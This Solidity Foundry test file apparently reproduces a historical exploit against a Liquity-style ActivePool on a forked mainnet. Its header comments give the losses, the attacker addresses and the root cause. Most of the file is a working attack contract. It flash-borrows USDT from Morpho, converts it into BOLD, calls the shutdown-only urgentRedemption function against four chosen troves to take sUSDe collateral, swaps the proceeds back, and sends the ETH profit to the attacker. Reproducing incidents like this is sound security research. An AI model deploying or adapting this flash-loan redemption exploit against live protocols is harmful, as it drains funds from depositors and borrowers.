// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,696.49 USD
// Attacker : 0xc8d64bb25b489ba3fb33f1f81505e8938685c248
// Attack Contract : 0xd94b9ad4918015724d5f68501f3252bb29505243
// Vulnerable Contract : 0xdee8a9ac2c2819fe6a3bae45a12bff70c604805a
// Attack Tx : https://etherscan.io/tx/0xc8ac54bdab9a2ce670a6ac2540e07dc88b5eeb7e0306e86d1d66f584428b3e0d
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xdee8a9ac2c2819fe6a3bae45a12bff70c604805a#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1379
//
// Attack summary: the attacker flash-borrowed USDT, converted it into BOLD, redeemed BOLD
// through Liquity's shutdown-only urgentRedemption path for sUSDe collateral, swapped the
// collateral back to USDT, converted the surplus to WETH, and withdrew it to ETH.
// Root cause: once the branch was shut down, public urgentRedemption allowed arbitrary callers
// to redeem BOLD against selected undercollateralized troves with a bonus. The transaction
// atomically sourced BOLD, selected profitable troves, extracted sUSDe collateral from the
// ActivePool, and repaid the flash loan.

address constant ATTACKER = address(uint160(0x00c8d64bb25b489ba3fb33f1f81505e8938685c248));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x00d94b9ad4918015724d5f68501f3252bb29505243));
address constant HISTORICAL_EXECUTOR = address(uint160(0x00e2be83aa486f7a921849ff71dce9b9c18a4b5db2));
address constant MORPHO = address(uint160(0x00bbbbbbbbbB9cC5e90e3b3Af64bdAF62C37EEFFcB));
address constant USDT_TOKEN = address(uint160(0x00dAC17F958D2ee523a2206206994597C13D831ec7));
address constant CURVE_USDT_BOLD_POOL = address(uint160(0x004f493B7dE8aAC7d55F71853688B1F7C8f0243c85));
address constant CURVE_BOLD_POOL = address(uint160(0x0095591348fE9718BE8BFA3afcC9b017D9ec18a7fA));
address constant TROVE_MANAGER = address(uint160(0x009Dc845B500853F17e238C36Ba120400dBEA1d02a));
address constant ACTIVE_POOL = address(uint160(0x00deE8a9AC2c2819fE6a3baE45A12bfF70C604805A));
address constant BOLD = address(uint160(0x0085e30b8B263bC64d94b827Ed450F2EdFEE8579DA));
address constant SUSDE = address(uint160(0x009D39A5DE30e57443BfF2A8307A4256c8797A3497));
address constant FLUID_DEX = address(uint160(0x001dD125C32e4B5086c63cC13b3Ca02C4a2A61Fa9B));
address constant UNISWAP_V3_ROUTER = address(uint160(0x00E592427A0AEce92De3Edee1F18E0157C05861564));
address constant WETH_TOKEN = address(uint160(0x00C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

uint256 constant FLASH_USDT_AMOUNT = 108_500_000_000;
uint256 constant HISTORICAL_ETH_PROFIT = 1_038_522_285_394_433_553;
uint256 constant HISTORICAL_SWAP_DEADLINE = 1_751_499_807;

interface IMorphoFlashLoan1379 {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUSDT1379 {
    function approve(address spender, uint256 amount) external;
}

interface ICurveAddLiquidity1379 {
    function add_liquidity(uint256[] calldata amounts, uint256 minMintAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy, address receiver) external returns (uint256);
}

interface ITroveManager1379 {
    function urgentRedemption(uint256 boldAmount, uint256[] calldata troveIds, uint256 minCollateral) external;
}

interface IFluidDex1379 {
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external
        payable
        returns (uint256 amountOut);
}

interface IUniswapV3Router1379 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface IWETH1379 {
    function withdraw(
        uint256 amount
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_834_887);
        vm.roll(22_834_888);
        vm.warp(1_751_499_707);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_EXECUTOR, "Historical executor");
        vm.label(MORPHO, "Morpho flash lender");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(CURVE_USDT_BOLD_POOL, "Curve USDT/BOLD pool");
        vm.label(CURVE_BOLD_POOL, "Curve BOLD pool");
        vm.label(TROVE_MANAGER, "TroveManager");
        vm.label(ACTIVE_POOL, "ActivePool");
        vm.label(BOLD, "BOLD");
        vm.label(SUSDE, "sUSDe");
        vm.label(FLUID_DEX, "Fluid DEX");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 router");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;

        ActivePoolUrgentRedemptionAttack template = new ActivePoolUrgentRedemptionAttack(ATTACKER);
        vm.etch(HISTORICAL_EXECUTOR, address(template).code);
        vm.deal(HISTORICAL_EXECUTOR, 0);

        vm.prank(ATTACKER);
        ActivePoolUrgentRedemptionAttack(payable(HISTORICAL_EXECUTOR)).execute();

        assertEq(ATTACKER.balance - attackerEthBefore, HISTORICAL_ETH_PROFIT);
    }
}

contract ActivePoolUrgentRedemptionAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    receive() external payable {}

    function execute() external {
        IMorphoFlashLoan1379(MORPHO).flashLoan(USDT_TOKEN, FLASH_USDT_AMOUNT, "");
        payable(profitReceiver).transfer(address(this).balance);
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == MORPHO, "only Morpho");
        require(amount == FLASH_USDT_AMOUNT, "amount");

        IUSDT1379(USDT_TOKEN).approve(CURVE_USDT_BOLD_POOL, amount);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0;
        amounts[1] = amount;
        uint256 curveLp = ICurveAddLiquidity1379(CURVE_USDT_BOLD_POOL).add_liquidity(amounts, 0);

        IERC20(CURVE_USDT_BOLD_POOL).approve(CURVE_BOLD_POOL, curveLp);
        uint256 boldAmount = ICurveAddLiquidity1379(CURVE_BOLD_POOL).exchange(1, 0, curveLp, 0, address(this));

        IERC20(BOLD).approve(TROVE_MANAGER, boldAmount);
        uint256[] memory troveIds = new uint256[](4);
        troveIds[0] = 0x91b57cad558db9c86b9bb2ab54fde0b0a30d2c5c11f71ccb1b935897ef693dd2;
        troveIds[1] = 0x588866c16ec669c32dcfb231addd64ef8ce4165ee5565870207dc018c72dd8d3;
        troveIds[2] = 0x59bad19ede340d132118d499542b78b735be45649749eac55c6fe7b6bcc331b1;
        troveIds[3] = 0x5d2487f861a7fab7a16427de3316c3c563f50ad28cf8fc083330d8871dcd3ffd;
        ITroveManager1379(TROVE_MANAGER).urgentRedemption(boldAmount, troveIds, 0);

        uint256 susdeBalance = IERC20(SUSDE).balanceOf(address(this));
        IERC20(SUSDE).approve(FLUID_DEX, susdeBalance);
        IFluidDex1379(FLUID_DEX).swapIn(true, susdeBalance, 1, address(this));

        uint256 usdtSurplus = IERC20(USDT_TOKEN).balanceOf(address(this)) - FLASH_USDT_AMOUNT;
        IUSDT1379(USDT_TOKEN).approve(UNISWAP_V3_ROUTER, usdtSurplus);
        IUniswapV3Router1379(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3Router1379.ExactInputSingleParams({
                tokenIn: USDT_TOKEN,
                tokenOut: WETH_TOKEN,
                fee: 3000,
                recipient: address(this),
                deadline: HISTORICAL_SWAP_DEADLINE,
                amountIn: usdtSurplus,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        uint256 wethBalance = IERC20(WETH_TOKEN).balanceOf(address(this));
        IWETH1379(WETH_TOKEN).withdraw(wethBalance);

        IUSDT1379(USDT_TOKEN).approve(MORPHO, FLASH_USDT_AMOUNT);
    }
}
